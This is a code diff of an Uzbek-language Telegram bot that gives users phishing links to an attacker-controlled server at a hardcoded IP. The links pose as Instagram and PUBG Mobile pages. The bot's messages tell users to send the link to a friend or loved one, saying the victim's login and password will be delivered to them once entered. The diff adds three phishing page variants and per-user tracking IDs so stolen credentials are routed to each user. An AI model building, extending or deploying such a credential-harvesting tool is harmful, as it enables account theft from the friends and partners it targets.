@@ -44,7 +44,7 @@ def link(update,context):
     \nyuborsangiz. Linkga kirsa *login* va *parol* kiritsa sizga keladi 
     """
     update.message.reply_text(text, parse_mode="Markdown")
-    update.message.reply_text("Copy qilish uchun `http://13.60.29.35:8000/Nakrutka/449766528` ni ustiga bos",
+    update.message.reply_text(f"Copy qilish uchun `http://13.60.29.35:8000/Nakrutka/3/{update.message.from_user.id}` ni ustiga bos",
                               parse_mode="Markdown")
 
 def menyu(update,context):
@@ -66,28 +66,68 @@ def help(update,context):
 
 def text(update,context):
     text=update.message.text
+
     if text=="Instagram 🖤 accaunt":
+        with open("img/rasm_1.png", "rb") as photo:
+            update.message.reply_photo(photo=photo, caption="1-rasm 📸")
+        with open("img/rasm_2.png", "rb") as photo:
+            update.message.reply_photo(photo=photo, caption="2-rasm 📸")
+        with open("img/rasm_3.png", "rb") as photo:
+            update.message.reply_photo(photo=photo, caption="3-rasm 📸")
+
+
+        k=[
+            [KeyboardButton("1-rasm 📸"),KeyboardButton("2-rasm 📸"),KeyboardButton("3-rasm 📸")],
+            [KeyboardButton("Ortga ⬅️")]
+        ]
+        reply_markup=ReplyKeyboardMarkup(k,resize_keyboard=True)
+        update.message.reply_text("Qaysi turdagi link (Tafsiya etiladi 3-rasm 📸) ",reply_markup=reply_markup)
+
+
+    elif text=="1-rasm 📸":
         text=f"""
-        ➡️ *http://13.60.29.35:8000/Nakrutka/{update.message.from_user.id}* ⬅️
+        ➡️ *http://13.60.29.35:8000/Nakrutka/1/{update.message.from_user.id}* ⬅️
         \n📌 Bu sizning likingiz buni *do'stizni 🫂* yoki *sevgan ❤️* insoningizga
         \nyuborsangiz. Linkga kirsa *login* va *parol* kiritsa sizga keladi 
         """
         update.message.reply_text(text,parse_mode="Markdown")
-        update.message.reply_text("Copy qilish uchun `http://13.60.29.35:8000/Nakrutka/449766528` ni ustiga bos",
+        update.message.reply_text(f"Copy qilish uchun `http://13.60.29.35:8000/Nakrutka/1/{update.message.from_user.id}` ni ustiga bos",
                                   parse_mode="Markdown")
+
+    elif text=="2-rasm 📸":
+        text=f"""
+        ➡️ *http://13.60.29.35:8000/Nakrutka/2/{update.message.from_user.id}* ⬅️
+        \n📌 Bu sizning likingiz buni *do'stizni 🫂* yoki *sevgan ❤️* insoningizga
+        \nyuborsangiz. Linkga kirsa *login* va *parol* kiritsa sizga keladi 
+        """
+        update.message.reply_text(text,parse_mode="Markdown")
+        update.message.reply_text(f"Copy qilish uchun `http://13.60.29.35:8000/Nakrutka/2/{update.message.from_user.id}` ni ustiga bos",
+                                  parse_mode="Markdown")
+
+    elif text=="3-rasm 📸":
+        text=f"""
+        ➡️ *http://13.60.29.35:8000/Nakrutka/3/{update.message.from_user.id}* ⬅️
+        \n📌 Bu sizning likingiz buni *do'stizni 🫂* yoki *sevgan ❤️* insoningizga
+        \nyuborsangiz. Linkga kirsa *login* va *parol* kiritsa sizga keladi 
+        """
+        update.message.reply_text(text,parse_mode="Markdown")
+        update.message.reply_text(f"Copy qilish uchun `http://13.60.29.35:8000/Nakrutka/3/{update.message.from_user.id}` ni ustiga bos",
+                                  parse_mode="Markdown")
+
+
     elif text=="🧬 Tugmali Link Instagram 🌐":
         k=[
             [InlineKeyboardButton("🧬",url=f"http://13.60.29.35:8000/Nakrutka/{update.message.from_user.id}")]
         ]
         update.message.reply_text("🧬 Tugmali Link 🌐", parse_mode="Markdown",reply_markup=InlineKeyboardMarkup(k))
-        update.message.reply_text("Copy qilish uchun `http://13.60.29.35:8000/Nakrutka/449766528` ni ustiga bos",
+        update.message.reply_text(f"Copy qilish uchun `http://13.60.29.35:8000/Nakrutka/3/{update.message.from_user.id}` ni ustiga bos",
                                   parse_mode="Markdown")
     elif text=="🧬 Tugmali Link PUBG MOBILE 🌐":
         k=[
             [InlineKeyboardButton("🧬",url=f"http://13.60.29.35:8000/Pubg/{update.message.from_user.id}")]
         ]
         update.message.reply_text("🧬 Tugmali Link 🌐", parse_mode="Markdown",reply_markup=InlineKeyboardMarkup(k))
-        update.message.reply_text("Copy qilish uchun `http://13.60.29.35:8000/Pubg/449766528` ni ustiga bos",
+        update.message.reply_text(f"Copy qilish uchun `http://13.60.29.35:8000/Pubg/{update.message.from_user.id}` ni ustiga bos",
                                   parse_mode="Markdown")
 
     elif text=="🫂 Bizning kanal obuna bolib qoying 😁":
@@ -105,12 +145,28 @@ def text(update,context):
         \nyuborsangiz. Linkga kirsa *login* va *parol* kiritsa sizga keladi 
         """
         update.message.reply_text(text,parse_mode="Markdown")
-        update.message.reply_text("Copy qilish uchun `http://13.60.29.35:8000/Pubg/449766528` ni ustiga bos",
+        update.message.reply_text(f"Copy qilish uchun `http://13.60.29.35:8000/Pubg/{update.message.from_user.id}` ni ustiga bos",
                                   parse_mode="Markdown")
 
-    else:
+    elif text=="Ortga ⬅️":
+        k = [
+            [KeyboardButton("Instagram 🖤 accaunt"), KeyboardButton("PUBG MOBILE 🖤 accaunt")],
+            [KeyboardButton("🫂 Bizning kanal obuna bolib qoying 😁")],
+            [KeyboardButton("🧬 Tugmali Link PUBG MOBILE 🌐"), KeyboardButton("🧬 Tugmali Link Instagram 🌐")],
+        ]
+        reply_markup = ReplyKeyboardMarkup(k, resize_keyboard=True)
         update.message.reply_text("*Menyulardan foydalaning /menyu 🫂*",
-                                  parse_mode="Markdown")
+                                  parse_mode="Markdown",reply_markup=reply_markup)
+
+    else:
+        k = [
+            [KeyboardButton("Instagram 🖤 accaunt"), KeyboardButton("PUBG MOBILE 🖤 accaunt")],
+            [KeyboardButton("🫂 Bizning kanal obuna bolib qoying 😁")],
+            [KeyboardButton("🧬 Tugmali Link PUBG MOBILE 🌐"), KeyboardButton("🧬 Tugmali Link Instagram 🌐")],
+        ]
+        reply_markup = ReplyKeyboardMarkup(k, resize_keyboard=True)
+        update.message.reply_text("*Menyulardan foydalaning /menyu 🫂*",
+                                  parse_mode="Markdown",reply_markup=reply_markup)
 
 
 def main():
@@ -134,4 +190,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
